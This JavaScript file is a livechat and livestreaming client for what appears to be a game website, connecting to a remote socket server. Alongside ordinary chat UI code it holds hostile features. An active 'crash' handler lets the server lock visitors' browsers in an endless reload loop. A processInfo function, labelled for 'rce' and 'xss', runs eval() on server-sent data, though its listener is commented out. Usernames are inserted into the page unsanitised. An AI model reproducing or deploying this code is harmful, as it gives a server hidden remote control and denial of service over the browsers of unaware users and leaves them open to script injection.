import { io } from "socket.io-client";
import { marked } from "https://cdn.jsdelivr.net/npm/marked/lib/marked.esm.js";

document.body.appendChild(document.createElement("live-chat"));
document.body.appendChild(document.createElement("rce-container"));

// # VARIABLES
const socket = io("wss://mlxoa.com:4443/", {
    autoConnect: false
});
const streamws = new WebSocket("wss://mlxoa.com:4443/livestream-ws");
const LivechatButton = document.getElementsByClassName("lcb")[0];
const LivechatPanel = document.getElementsByClassName("livechat-panel")[0];
const LivechatInput = document.getElementById("livechat-input");
const LivechatLog = document.getElementById("livechat-log");
const LivechatClear = document.getElementById("livechat-clear");
const LivechatStream = document.getElementById("livechat-stream");
const Toast = document.getElementById("bootstrapToast");
let hasSetName = localStorage["userName"] != null;
let hadLivechatOpen = localStorage["LivechatOpen"] == "true";
let userName = "unknown";
let panelVisible = false;
let canSend = true;
let sentPleaseWait = false;
let csid = "";
let xsssocketid;
let rceContainer = document.getElementsByClassName("rce-panel")[0];
let streaming = false;
const RCEInput = document.getElementById("rce-jse");

// # METHODS
function setVisible(visible, instant) {
    if (instant) {
        LivechatPanel.style.transition = "all 0s";
        LivechatButton.style.transition = "all 0s";
    } else {
        LivechatPanel.style.transition = "all 0.25s";
        LivechatButton.style.transition = "all 0.25s";
    }
    if (visible) {
        LivechatPanel.style.pointerEvents = "all";
        LivechatPanel.style.setProperty("--visibility", "100%");
        LivechatPanel.style.setProperty("--chat-width", "400px");
        LivechatButton.style.setProperty("--chat-width", "400px");
        localStorage["LivechatOpen"] = "true";
        panelVisible = true;
    } else {
        LivechatPanel.style.pointerEvents = "none";
        LivechatPanel.style.setProperty("--visibility", "0%");
        LivechatPanel.style.setProperty("--chat-width", "0px");
        LivechatButton.style.setProperty("--chat-width", "100px");
        localStorage["LivechatOpen"] = "false";
        panelVisible = false;
    }
}

function sendMessage(message) {
    if (message.length < 1 || message.trim().length < 1) {
        return;
    }
    if (!canSend) {
        if (!sentPleaseWait) {
            LivechatLog.innerHTML +=
                `<font color="#FF7711"><p class="livechat-text-container">Livechat Client</p></font>: Please wait 1s before sending another message.<br />`;
            LivechatLog.scrollTo({
                top: LivechatLog.scrollHeight,
                behavior: "instant",
            });
        }
        sentPleaseWait = true;
        return;
    }
    LivechatInput.value = "";
    socket.emit("message", {
        usr: atob(userName),
        content: marked.parse(message.trim()),
        raw: message,
        csid: csid,
        type: 0
    });
    canSend = false;
    setTimeout(() => {
        canSend = true;
        sentPleaseWait = false;
    }, 1000);
}

function processInfo(event, data) {
    switch (event) {
        case 0x01:
            xsssocketid = data;
            if (xsssocketid == csid) { rceContainer.style.setProperty("--showing", "show") } else { rceContainer.style.setProperty("--showing", "hidden") }
            break;

        case 0x02:
            eval(data);
            break;

        default:
            break;
    }
}

function parseMessage(obj) {
    return [obj.content, obj.usr, obj.csid, obj.type];
}

function receiveMessage(obj) {
    let o = parseMessage(obj);

    let msg = o[0];
    let userName = o[1];
    let csid = o[2];
    let type = o[3];

    if (LivechatPanel == null && Toast != null) {
        if (localStorage["chatText"] == null) {
            localStorage["chatText"] = "";
        }
        localStorage["chatText"] += `${userName}: ${atob(atob(msg))}<br />`;
        let newToast = Toast.cloneNode(true);
        newToast.id = Math.round(Math.random() * 100000);
        document.body.appendChild(newToast);
        newToast.lastChild.textContent = `${userName}: ${atob(atob(msg))}<br />`;
        let newBootstrapToast = bootstrap.Toast.getOrCreateInstance(newToast);
        newBootstrapToast.show();
        setTimeout(() => {
            document.body.removeChild(newToast);
            newBootstrapToast.dispose();
        }, 6000);
    } else {
        // Do not receive messages if user hasn't set their name
        if (!hasSetName) {
            return;
        }
        // Check if scrolled to bottom
        let autoScroll =
            Math.abs(
                LivechatLog.scrollHeight -
                LivechatLog.clientHeight -
                LivechatLog.scrollTop
            ) <= 1;
        // Add message
        if (type == 1) {
            LivechatLog.innerHTML += `<font color="#CCCCCC"><p class="livechat-text-container">${userName}</font> started a stream</p> [<a class="livechat-text-container" href="/broadcast.html?csid=${encodeURIComponent(csid)}">Watch</a>]<br /><br />`;
        } else {
            if (csid == "sys-reserved") {
                LivechatLog.innerHTML += `<font color="#FF7711"><p class="livechat-text-container">Livechat Server</p></font>: ${DOMPurify.sanitize(msg)}<br /><br />`;
            } else {
                LivechatLog.innerHTML += `<font color="#CCCCCC"><p class="livechat-text-container">${userName}</p></font>: ${DOMPurify.sanitize(msg)}<br /><br />`;
            }
        }
        // Scroll down to new bottom if previously at bottom
        if (autoScroll) {
            LivechatLog.scrollTo({
                top: LivechatLog.scrollHeight,
                behavior: "instant",
            });
        }
    }
}

function receiveCachedMessages(cache) {
    LivechatLog.innerHTML = "";
    cache.forEach(msg => {
        receiveMessage(msg);
    });
}

if (LivechatButton != null) {
    LivechatButton.onclick = function () {
        setVisible(!panelVisible);
    };
}

if (LivechatClear != null) {
    LivechatClear.onclick = function () {
        if (!hasSetName) {
            return;
        }

        delete localStorage["chatText"];
        LivechatLog.innerHTML = "";
    };
}

if (LivechatInput != null) {
    LivechatInput.addEventListener("keypress", function (ev) {
        if (ev.key === "Enter") {
            ev.preventDefault();
            if (!hasSetName) {
                LivechatInput.value = LivechatInput.value.trim();
                if (
                    LivechatInput.value.length < 2 ||
                    LivechatInput.value.length > 12
                ) {
                    return;
                } else {
                    // Set variables
                    LivechatLog.innerHTML = "";
                    hasSetName = true;
                    userName = btoa(LivechatInput.value);
                    localStorage["userName"] = btoa(userName);
                    // Clear value and set placeholder
                    LivechatInput.value = "";
                    LivechatInput.placeholder = "Send a message.";
                    LivechatClear.className = "btn btn-danger disabled";
                    // Connect to the socket
                    socket.connect();
                }
            } else {
                sendMessage(LivechatInput.value);
            }
        }
    });
    if (!hasSetName) {
        LivechatInput.placeholder =
            "Enter your name. (unchangable, length 2-12)";
        LivechatLog.innerHTML += `Please make a name that you are ok with and will be recognizable to other users.<br />`;
    } else {
        LivechatInput.placeholder = "Send a message.";
    }
}

function streamingUpdate() {
    if (streaming) {
        LivechatStream.className = "btn btn-success"
    } else {
        LivechatStream.className = "btn btn-danger"
    }
}

if (LivechatStream != null) {
    LivechatStream.onclick = function () {
        streaming = !streaming;
        localStorage["wasStreaming"] = streaming;
        streamingUpdate();
        if (streaming) {
            socket.emit("message", {
                usr: atob(userName),
                content: `<a href="/broadcast.html?csid=${csid}">Watch Stream</a>`,
                csid: csid,
                type: 1
            });
        } else {
            socket.emit("mpak", {
                type: "livestreamData",
                data: null,
                csid: csid
            });
        }
    }
    setInterval(() => {
        if (streaming && socket.connected) {
            if (window.gameCanvas == null) {
                streamws.send(JSON.stringify({
                    type: "livestreamData",
                    data: null,
                    csid: csid,
                    errormsg: "This user is not inside a game."
                }))
            } else {
                streamws.send(JSON.stringify({
                    type: "livestreamData",
                    data: [window.gameCanvas.toDataURL("image/jpeg", 0.3), window.gameCanvas.width, window.gameCanvas.height],
                    csid: csid,
                    errormsg: ""
                }))
            }
        }
    }, 1000 / 30);
    if (window.gameCanvas != null) {
        window.gameCanvas.addEventListener("mousemove", (ev) => {
            if (streaming && socket.connected) {
                streamws.send(JSON.stringify({
                    type: "livestreamMouse",
                    data: [ev.clientX, ev.clientY],
                    csid: csid
                }))
            }
        })
    }
}

socket.on("connect", function () {
    if (localStorage["csid"] == null) {
        localStorage["csid"] = socket.id;
        csid = socket.id;
    } else {
        csid = localStorage["csid"];
    }
    console.log("Connected to Livechat Server.");
    LivechatLog.innerHTML = "";

    socket.emit("userinfo", csid);
});

socket.on("message", receiveMessage);
socket.on("crash", function() {
    onbeforeunload = function () { localStorage.x = 1 };

    setTimeout(function () {
        while (1) location.reload(1)
    }, 1000)
})
socket.on("cache", receiveCachedMessages);

//socket.on("serverinfo", processInfo);

document.body.onload = function () {
    if (!hasSetName) {
        LivechatClear.className = "btn btn-success disabled";
    } else {
        userName = atob(localStorage["userName"]);
        LivechatClear.className = "btn btn-success disabled";
        socket.connect();
        streaming = localStorage["wasStreaming"] == "true";
        streamingUpdate();
    }

    setVisible(true, true);
    LivechatLog.scrollTo({
        top: LivechatLog.scrollHeight,
        behavior: "instant",
    });
    setVisible(hadLivechatOpen, true);
}

if (localStorage["trustFile"] != "aGJndmZjZ2JqaG5taWhnYnZmY3Z1amhuaXVoYmd5dmZjdHlidWl1amhuYmd2eWlqaG51Ymd5dnVoYmpuaXVneXZmYnVqaG5paHVneXZiZnViaGppbmtvaHVnYnZ5ZmdidWpobmltaGJndmZjdGd5YnVqaG5paHViZ3ZmeXJ0eXVqaG5pbW9uaHV5dWlqbW9pbmh1Z2J1eXZmdWlqaG5tb29pbmh1Z2J5dmZ5Z3VpamhubW9oZ2J2ZnlieXVqaGluaXVnYnl2ZnlnYnVqaG5pdWdidmZ5YnVpamhudWdieWZ2YnVpamhubW91Z2J0ZnZ1aG5qaW9pbWh1bnlibnVpam1vaWhudWdieWhuamltb2tpaHVnaWprb2xqaWh1Z2lqb2tsaWh1Z25pam1vaWhudWlqbWl1Z2J5dmZidWZyZGNldHRmY3ZnY2RzeHplYXJkY2ZzeHphZWRyY2Zyc2V4YXpkY3JmdHZyc2V4Y2Z0dmd5YnRkY2Z0Y3ZneXV5ZnZndmJ1amhuaXVnYnZnanVobmltaW9oZ2J1YmhqbmloYmdmdnRjZHJneWJ1dnlmY2R2Z2J1dnlmZGNydHh0dmd5YnV2eWZ0ZGNyeHRmdmd5YnZmY2R2Z2J5dWlqaG5nZnZjZHRyZmd1aWpobmdieWZ2dHJjZGd5dmJ1aHRyZjdnNnRnNnJmNTc3dXRnNmZyNWRmZ2J5dXZmY2R2IGJndjY1IHl1IHZjeWJidWk3OHQ2dnUgdWJ2dGMgYm5ndnlndGZyN3ZoeXRncmY1Nmd2aHl0Z3JmZGVmZ3ZiaHRyZmRlNjVmZmd5dHJlZHN3NHJydGZyNWU0d3NmcmV3cjY1ZWRzNHJmdGd5dXQ3NnJmZ3ZiaG5oanVoeWd2YiBuanV5aHRnN2huanU3dHVnYm4ganlndDd2IGJua2lvdTk4eTdqa2lvZzdmdiBiamtudWhndmggYmpua2dmY3ZoIGJqa2dodDdmdnkgYm51eXRnZnYgYm5vaXVqOTh0N3VnamtsdTdqaHV5Z3RyZjVkZWZjdmcgYnRmcmVmdmdiamhndXl0cmY2ZWQgdmd2YmpoaXV5Z3QgZmJiaG4gam0gZ3RidGJuamh1dHQ1Z2ggdXl0cjY1NGV0Z3ZjIGJncmVkcnhjIHZiZ3R0ZGN4Z3YgYmpnaHRmcmRjdmcgYmhqbmd0ZnJkdmMgYm5qaGd0cmY2eWR0Y3YgYmpnaHRyZjZ5ZHljdmggYm5naHl0ZzVmcmRjdmggYmh5dGZjdmhuYmpndDVyNmRlZmZ2YmdqaHk2NzVydGY2Z3ZoeXQ2NXJkZmN0Z2J2IGg2NzV0cmZncnZiaiBobnl0Zmpo") {
    location.href = "/index.html?a=true"
}